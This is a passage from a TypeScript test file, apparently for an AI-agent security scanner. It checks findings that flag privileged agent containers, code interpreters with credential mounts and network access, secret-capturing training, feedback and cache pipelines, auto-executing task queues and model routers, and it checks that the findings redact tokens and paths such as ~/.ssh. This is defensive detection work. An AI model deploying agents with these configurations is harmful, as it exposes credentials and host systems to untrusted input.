    expect(JSON.stringify(runtimeContainerFindings[0])).not.toContain("${AGENT_CONTAINER_TOKEN}");
    expect(JSON.stringify(runtimeContainerFindings[0])).not.toContain("agentcsp-demo/support-agent");
    expect(JSON.stringify(runtimeContainerFindings[0])).not.toContain("/var/run/docker.sock");
    expect(JSON.stringify(runtimeContainerFindings[0])).not.toContain("~/.ssh");
    expect(JSON.stringify(runtimeContainerFindings[0])).not.toContain("untrusted_customer_ticket");
    const runtimeContainerHostRootFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-107");
    expect(runtimeContainerHostRootFindings).toHaveLength(1);
    expect(runtimeContainerHostRootFindings[0]?.matched_object.path).toBe("runtime/agent-container.yaml");
    expect(runtimeContainerHostRootFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_container_runtime_config: true,
      agent_container_provider: "docker",
      agent_container_runtime_enabled: true,
      agent_container_privileged: true,
      agent_container_root_user: true,
      agent_container_docker_socket_mount: true,
      agent_container_host_path_mount: true,
      agent_container_host_root_mount: true,
      agent_container_writable_host_mount: true,
      agent_container_credential_mount: true,
      agent_container_sensitive_mount: true,
      agent_container_host_network: true,
      agent_container_host_pid: true,
      agent_container_host_ipc: true,
      agent_container_dangerous_capability: true,
      agent_container_shell_authority: true,
      agent_container_filesystem_authority: true,
      agent_container_browser_authority: true,
      agent_container_docker_authority: true,
      agent_container_untrusted_input: true,
      agent_container_secret_env_exposure: true,
      agent_container_approval_required: false
    });
    expect(runtimeContainerHostRootFindings[0]?.matched_object.metadata.agent_container_mount_kinds).toEqual([
      "credential_path",
      "docker_socket",
      "host_path",
      "host_root",
      "sensitive_host_path",
      "writable_host_path"
    ]);
    expect(runtimeContainerHostRootFindings[0]?.matched_object.metadata.agent_container_capability_categories).toEqual([
      "net_admin",
      "privileged_mode",
      "sys_admin"
    ]);
    expect(runtimeContainerHostRootFindings[0]?.matched_object.metadata.agent_container_tool_authority_categories).toEqual([
      "browser",
      "docker",
      "filesystem",
      "mcp",
      "shell"
    ]);
    expect(runtimeContainerHostRootFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeContainerHostRootFindings[0]?.matched_object.actions).toContain("execute");
    expect(runtimeContainerHostRootFindings[0]?.matched_object.actions).toContain("write");
    expect(runtimeContainerHostRootFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeContainerHostRootFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeContainerHostRootFindings[0]?.severity).toBe("critical");
    expect(runtimeContainerHostRootFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContainerHostRootFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("${AGENT_CONTAINER_TOKEN}");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("agentcsp-demo/support-agent");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("/var/run/docker.sock");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("~/.ssh");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeContainerHostRootFindings[0])).not.toContain("retrieved_customer_context");
    const runtimeCodeInterpreterFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-027");
    expect(runtimeCodeInterpreterFindings).toHaveLength(1);
    expect(runtimeCodeInterpreterFindings[0]?.matched_object.path).toBe("code-interpreter/python-runtime.yaml");
    expect(runtimeCodeInterpreterFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_code_interpreter_config: true,
      agent_code_interpreter_provider: "jupyter",
      agent_code_interpreter_enabled: true,
      agent_code_interpreter_executes_model_code: true,
      agent_code_interpreter_untrusted_input: true,
      agent_code_interpreter_network_enabled: true,
      agent_code_interpreter_package_install: true,
      agent_code_interpreter_filesystem_access: true,
      agent_code_interpreter_secret_env_exposure: true,
      agent_code_interpreter_approval_required: false
    });
    expect(runtimeCodeInterpreterFindings[0]?.matched_object.metadata.agent_code_interpreter_mount_kinds).toEqual([
      "credential_path",
      "host_path",
      "workspace_mount"
    ]);
    expect(runtimeCodeInterpreterFindings[0]?.severity).toBe("critical");
    expect(runtimeCodeInterpreterFindings[0]?.confidence).toBe("very_high");
    expect(runtimeCodeInterpreterFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("${CODE_INTERPRETER_TOKEN}");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("python3");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("~/.aws");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("~/.ssh");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeCodeInterpreterFindings[0])).not.toContain("browser_tool_output");
    const runtimeCodeInterpreterExfiltrationFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-081"
    );
    expect(runtimeCodeInterpreterExfiltrationFindings).toHaveLength(1);
    expect(runtimeCodeInterpreterExfiltrationFindings[0]?.matched_object.path).toBe(
      "code-interpreter/python-runtime.yaml"
    );
    expect(runtimeCodeInterpreterExfiltrationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_code_interpreter_config: true,
      agent_code_interpreter_provider: "jupyter",
      agent_code_interpreter_enabled: true,
      agent_code_interpreter_executes_model_code: true,
      agent_code_interpreter_untrusted_input: true,
      agent_code_interpreter_network_enabled: true,
      agent_code_interpreter_package_install: true,
      agent_code_interpreter_shell_access: true,
      agent_code_interpreter_filesystem_access: true,
      agent_code_interpreter_workspace_write: true,
      agent_code_interpreter_output_capture: true,
      agent_code_interpreter_output_persistence: true,
      agent_code_interpreter_credential_mount: true,
      agent_code_interpreter_secret_env_exposure: true,
      agent_code_interpreter_approval_required: false
    });
    expect(
      runtimeCodeInterpreterExfiltrationFindings[0]?.matched_object.metadata.agent_code_interpreter_mount_kinds
    ).toEqual(["credential_path", "host_path", "workspace_mount"]);
    expect(runtimeCodeInterpreterExfiltrationFindings[0]?.severity).toBe("critical");
    expect(runtimeCodeInterpreterExfiltrationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeCodeInterpreterExfiltrationFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("${CODE_INTERPRETER_TOKEN}");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("python3");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("~/.aws");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("~/.ssh");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeCodeInterpreterExfiltrationFindings[0])).not.toContain("browser_tool_output");
    const runtimeTrainingDatasetFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-028");
    expect(runtimeTrainingDatasetFindings).toHaveLength(1);
    expect(runtimeTrainingDatasetFindings[0]?.matched_object.path).toBe("training/fine-tune-dataset.yaml");
    expect(runtimeTrainingDatasetFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_training_dataset_config: true,
      ai_training_dataset_provider: "openai",
      ai_training_dataset_model_update_enabled: true,
      ai_training_dataset_remote_upload: true,
      ai_training_dataset_sensitive_capture: true,
      ai_training_dataset_secret_capture: true,
      ai_training_dataset_redaction_disabled: true,
      ai_training_dataset_untrusted_input: true,
      ai_training_dataset_approval_required: false
    });
    expect(runtimeTrainingDatasetFindings[0]?.matched_object.metadata.ai_training_dataset_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeTrainingDatasetFindings[0]?.severity).toBe("critical");
    expect(runtimeTrainingDatasetFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTrainingDatasetFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("${FINE_TUNE_TOKEN}");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("support-escalation-finetune");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("training_customer_email");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("training_account_number");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("training_confidential_agent_notes");
    expect(JSON.stringify(runtimeTrainingDatasetFindings[0])).not.toContain("support_memory_summary");
    const runtimeTrainingRetentionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-089");
    expect(runtimeTrainingRetentionFindings).toHaveLength(1);
    expect(runtimeTrainingRetentionFindings[0]?.matched_object.path).toBe("training/fine-tune-dataset.yaml");
    expect(runtimeTrainingRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_training_dataset_config: true,
      ai_training_dataset_provider: "openai",
      ai_training_dataset_model_update_enabled: true,
      ai_training_dataset_remote_upload: true,
      ai_training_dataset_prompt_capture: true,
      ai_training_dataset_completion_capture: true,
      ai_training_dataset_tool_output_capture: true,
      ai_training_dataset_retrieval_capture: true,
      ai_training_dataset_memory_capture: true,
      ai_training_dataset_browser_capture: true,
      ai_training_dataset_secret_capture: true,
      ai_training_dataset_pii_capture: true,
      ai_training_dataset_untrusted_input: true,
      ai_training_dataset_redaction_disabled: true,
      ai_training_dataset_retention_enabled: true,
      ai_training_dataset_approval_required: false
    });
    expect(runtimeTrainingRetentionFindings[0]?.matched_object.metadata.ai_training_dataset_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeTrainingRetentionFindings[0]?.severity).toBe("critical");
    expect(runtimeTrainingRetentionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTrainingRetentionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("${FINE_TUNE_TOKEN}");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("support-escalation-finetune");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("training_customer_email");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("training_account_number");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("training_confidential_agent_notes");
    expect(JSON.stringify(runtimeTrainingRetentionFindings[0])).not.toContain("support_memory_summary");
    const runtimeFeedbackPipelineFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-044");
    expect(runtimeFeedbackPipelineFindings).toHaveLength(1);
    expect(runtimeFeedbackPipelineFindings[0]?.matched_object.path).toBe("feedback/support-feedback-loop.yaml");
    expect(runtimeFeedbackPipelineFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_feedback_pipeline_config: true,
      ai_feedback_provider: "humanloop",
      ai_feedback_remote_export: true,
      ai_feedback_training_promotion_enabled: true,
      ai_feedback_model_update_enabled: true,
      ai_feedback_eval_set_write: true,
      ai_feedback_sensitive_capture: true,
      ai_feedback_secret_capture: true,
      ai_feedback_pii_capture: true,
      ai_feedback_redaction_disabled: true,
      ai_feedback_untrusted_input: true,
      ai_feedback_approval_required: false
    });
    expect(runtimeFeedbackPipelineFindings[0]?.matched_object.metadata.ai_feedback_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "feedback_label",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeFeedbackPipelineFindings[0]?.severity).toBe("critical");
    expect(runtimeFeedbackPipelineFindings[0]?.confidence).toBe("very_high");
    expect(runtimeFeedbackPipelineFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("${FEEDBACK_PIPELINE_TOKEN}");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("feedback.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("untrusted_customer_rating");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("support_agent_freeform_feedback");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("feedback_customer_email");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("feedback_account_number");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("feedback_authorization_header");
    expect(JSON.stringify(runtimeFeedbackPipelineFindings[0])).not.toContain("support-feedback-rlhf-dataset");
    const runtimeFeedbackAutoPromotionFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-097"
    );
    expect(runtimeFeedbackAutoPromotionFindings).toHaveLength(1);
    expect(runtimeFeedbackAutoPromotionFindings[0]?.matched_object.path).toBe("feedback/support-feedback-loop.yaml");
    expect(runtimeFeedbackAutoPromotionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_feedback_pipeline_config: true,
      ai_feedback_provider: "humanloop",
      ai_feedback_collection_enabled: true,
      ai_feedback_remote_export: true,
      ai_feedback_prompt_capture: true,
      ai_feedback_completion_capture: true,
      ai_feedback_tool_output_capture: true,
      ai_feedback_retrieval_capture: true,
      ai_feedback_memory_capture: true,
      ai_feedback_browser_capture: true,
      ai_feedback_secret_capture: true,
      ai_feedback_sensitive_capture: true,
      ai_feedback_pii_capture: true,
      ai_feedback_untrusted_input: true,
      ai_feedback_training_promotion_enabled: true,
      ai_feedback_model_update_enabled: true,
      ai_feedback_eval_set_write: true,
      ai_feedback_redaction_disabled: true,
      ai_feedback_consent_required: false,
      ai_feedback_retention_enabled: true,
      ai_feedback_approval_required: false
    });
    expect(runtimeFeedbackAutoPromotionFindings[0]?.matched_object.metadata.ai_feedback_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "feedback_label",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeFeedbackAutoPromotionFindings[0]?.severity).toBe("critical");
    expect(runtimeFeedbackAutoPromotionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeFeedbackAutoPromotionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("${FEEDBACK_PIPELINE_TOKEN}");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("feedback.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("untrusted_customer_rating");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("support_agent_freeform_feedback");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("feedback_customer_email");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("feedback_account_number");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("feedback_authorization_header");
    expect(JSON.stringify(runtimeFeedbackAutoPromotionFindings[0])).not.toContain("support-feedback-rlhf-dataset");
    const runtimeTaskQueueFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-046");
    expect(runtimeTaskQueueFindings).toHaveLength(1);
    expect(runtimeTaskQueueFindings[0]?.matched_object.path).toBe("queues/support-agent-jobs.yaml");
    expect(runtimeTaskQueueFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_task_queue_config: true,
      agent_task_queue_provider: "bullmq",
      agent_task_queue_background_consumer: true,
      agent_task_queue_auto_execute: true,
      agent_task_queue_untrusted_payload: true,
      agent_task_queue_prompt_passthrough: true,
      agent_task_queue_tool_output_passthrough: true,
      agent_task_queue_replay_enabled: true,
      agent_task_queue_privileged_tool_authority: true,
      agent_task_queue_write_authority: true,
      agent_task_queue_external_authority: true,
      agent_task_queue_secret_exposure: true,
      agent_task_queue_sensitive_payload: true,
      agent_task_queue_pii_payload: true,
      agent_task_queue_approval_required: false
    });
    expect(runtimeTaskQueueFindings[0]?.matched_object.metadata.agent_task_queue_payload_categories).toEqual([
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeTaskQueueFindings[0]?.matched_object.metadata.agent_task_queue_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeTaskQueueFindings[0]?.severity).toBe("critical");
    expect(runtimeTaskQueueFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTaskQueueFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("${AGENT_TASK_QUEUE_URL}");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("customer-support-agent-jobs");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("support-agent-dlq");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("support_ticket_event");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("queued_customer_email");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("queued_customer_account_id");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("queued_confidential_case_notes");
    expect(JSON.stringify(runtimeTaskQueueFindings[0])).not.toContain("queued_support_api_token");
    const runtimeTaskQueueReplayFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-073");
    expect(runtimeTaskQueueReplayFindings).toHaveLength(1);
    expect(runtimeTaskQueueReplayFindings[0]?.matched_object.path).toBe("queues/support-agent-jobs.yaml");
    expect(runtimeTaskQueueReplayFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_task_queue_config: true,
      agent_task_queue_provider: "bullmq",
      agent_task_queue_background_consumer: true,
      agent_task_queue_auto_execute: true,
      agent_task_queue_untrusted_payload: true,
      agent_task_queue_prompt_passthrough: true,
      agent_task_queue_tool_output_passthrough: true,
      agent_task_queue_retry_enabled: true,
      agent_task_queue_dead_letter_queue: true,
      agent_task_queue_replay_enabled: true,
      agent_task_queue_privileged_tool_authority: true,
      agent_task_queue_secret_exposure: true,
      agent_task_queue_sensitive_payload: true,
      agent_task_queue_pii_payload: true,
      agent_task_queue_approval_required: false
    });
    expect(runtimeTaskQueueReplayFindings[0]?.matched_object.metadata.agent_task_queue_payload_categories).toEqual([
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeTaskQueueReplayFindings[0]?.severity).toBe("critical");
    expect(runtimeTaskQueueReplayFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTaskQueueReplayFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("${AGENT_TASK_QUEUE_URL}");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("customer-support-agent-jobs");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("support-agent-dlq");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("support_ticket_event");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("queued_customer_email");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("queued_customer_account_id");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("queued_confidential_case_notes");
    expect(JSON.stringify(runtimeTaskQueueReplayFindings[0])).not.toContain("queued_support_api_token");
    const runtimePromptCacheFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-029");
    expect(runtimePromptCacheFindings).toHaveLength(1);
    expect(runtimePromptCacheFindings[0]?.matched_object.path).toBe("prompt-cache/llm-response-cache.yaml");
    expect(runtimePromptCacheFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_llm_prompt_cache_config: true,
      llm_prompt_cache_provider: "redis",
      llm_prompt_cache_remote: true,
      llm_prompt_cache_shared: true,
      llm_prompt_cache_replay_enabled: true,
      llm_prompt_cache_sensitive_capture: true,
      llm_prompt_cache_secret_capture: true,
      llm_prompt_cache_redaction_disabled: true,
      llm_prompt_cache_untrusted_input: true,
      llm_prompt_cache_approval_required: false
    });
    expect(runtimePromptCacheFindings[0]?.matched_object.metadata.llm_prompt_cache_capture_categories).toEqual([
      "browser_context",
      "completion_context",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimePromptCacheFindings[0]?.severity).toBe("critical");
    expect(runtimePromptCacheFindings[0]?.confidence).toBe("very_high");
    expect(runtimePromptCacheFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("${LLM_CACHE_TOKEN}");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("${LLM_CACHE_URL}");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("llm-cache.example.invalid");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("support-agent-shared-cache");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("cache_customer_email");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("cache_account_number");
    expect(JSON.stringify(runtimePromptCacheFindings[0])).not.toContain("cache_confidential_agent_notes");
    const runtimePromptCacheCrossTenantFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-050");
    expect(runtimePromptCacheCrossTenantFindings).toHaveLength(1);
    expect(runtimePromptCacheCrossTenantFindings[0]?.matched_object.path).toBe("prompt-cache/llm-response-cache.yaml");
    expect(runtimePromptCacheCrossTenantFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_llm_prompt_cache_config: true,
      llm_prompt_cache_provider: "redis",
      llm_prompt_cache_remote: true,
      llm_prompt_cache_shared: true,
      llm_prompt_cache_semantic_reuse_enabled: true,
      llm_prompt_cache_user_controlled_key: true,
      llm_prompt_cache_broad_match_threshold: true,
      llm_prompt_cache_cross_tenant_replay: true,
      llm_prompt_cache_tenant_isolation_disabled: true,
      llm_prompt_cache_sensitive_capture: true,
      llm_prompt_cache_redaction_disabled: true,
      llm_prompt_cache_approval_required: false
    });
    expect(runtimePromptCacheCrossTenantFindings[0]?.severity).toBe("critical");
    expect(runtimePromptCacheCrossTenantFindings[0]?.confidence).toBe("very_high");
    expect(runtimePromptCacheCrossTenantFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("${LLM_CACHE_TOKEN}");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("${LLM_CACHE_URL}");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("llm-cache.example.invalid");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("support-agent-shared-cache");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("cache_customer_email");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("cache_account_number");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("cache_confidential_agent_notes");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("untrusted_customer_prompt");
    expect(JSON.stringify(runtimePromptCacheCrossTenantFindings[0])).not.toContain("global_support_semantic_cache");
    const runtimeModelRouterFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-030");
    expect(runtimeModelRouterFindings).toHaveLength(1);
    expect(runtimeModelRouterFindings[0]?.matched_object.path).toBe("models/model-router.yaml");
    expect(runtimeModelRouterFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_model_router_config: true,
      ai_model_router_provider: "litellm",
      ai_model_router_remote_providers: true,
      ai_model_router_fallback_enabled: true,
      ai_model_router_auto_fallback: true,
      ai_model_router_sensitive_context: true,
      ai_model_router_secret_context: true,
      ai_model_router_redaction_disabled: true,
      ai_model_router_untrusted_input: true,
      ai_model_router_approval_required: false
    });
    expect(runtimeModelRouterFindings[0]?.matched_object.metadata.ai_model_router_destination_kinds).toEqual([
      "configured_model_router_destination",
      "custom_model_gateway",
      "fallback_route",
      "http_model_endpoint",
      "managed_model_provider",
      "third_party_model_route"
    ]);
    expect(runtimeModelRouterFindings[0]?.severity).toBe("critical");
    expect(runtimeModelRouterFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelRouterFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("${MODEL_ROUTER_TOKEN}");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("${FALLBACK_MODEL_TOKEN}");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("api.anthropic.example.invalid");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("openrouter.example.invalid");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("unapproved-community-model");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeModelRouterFindings[0])).not.toContain("support_memory_summary");
    const runtimeModelRouterOutputRetentionFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-088"
    );
    expect(runtimeModelRouterOutputRetentionFindings).toHaveLength(1);
    expect(runtimeModelRouterOutputRetentionFindings[0]?.matched_object.path).toBe("models/model-router.yaml");
    expect(runtimeModelRouterOutputRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_model_router_config: true,
      ai_model_router_provider: "litellm",
      ai_model_router_remote_providers: true,
      ai_model_router_fallback_enabled: true,
      ai_model_router_auto_fallback: true,
      ai_model_router_sends_prompts: true,
      ai_model_router_sends_tool_outputs: true,
      ai_model_router_sends_retrieval_context: true,
      ai_model_router_sends_memory: true,
      ai_model_router_sensitive_context: true,
      ai_model_router_pii_context: true,
      ai_model_router_secret_context: true,
      ai_model_router_untrusted_input: true,
      ai_model_router_redaction_disabled: true,
      ai_model_router_records_outputs: true,
      ai_model_router_approval_required: false
    });
    expect(runtimeModelRouterOutputRetentionFindings[0]?.matched_object.metadata.ai_model_router_provider_categories).toEqual([
      "custom_model_gateway",
      "fallback_provider",
      "managed_model_provider",
      "model_router",
      "third_party_model_route"
    ]);
    expect(runtimeModelRouterOutputRetentionFindings[0]?.severity).toBe("critical");
    expect(runtimeModelRouterOutputRetentionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelRouterOutputRetentionFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("${MODEL_ROUTER_TOKEN}");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("${FALLBACK_MODEL_TOKEN}");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("api.anthropic.example.invalid");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("openrouter.example.invalid");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("unapproved-community-model");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeModelRouterOutputRetentionFindings[0])).not.toContain("support_memory_summary");
    const runtimeEmbeddingFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-031");
    expect(runtimeEmbeddingFindings).toHaveLength(1);
    expect(runtimeEmbeddingFindings[0]?.matched_object.path).toBe("embeddings/rag-indexer.yaml");
    expect(runtimeEmbeddingFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_embedding_pipeline_config: true,
      ai_embedding_provider: "openai",
      ai_embedding_remote_provider: true,
      ai_embedding_vector_write_enabled: true,
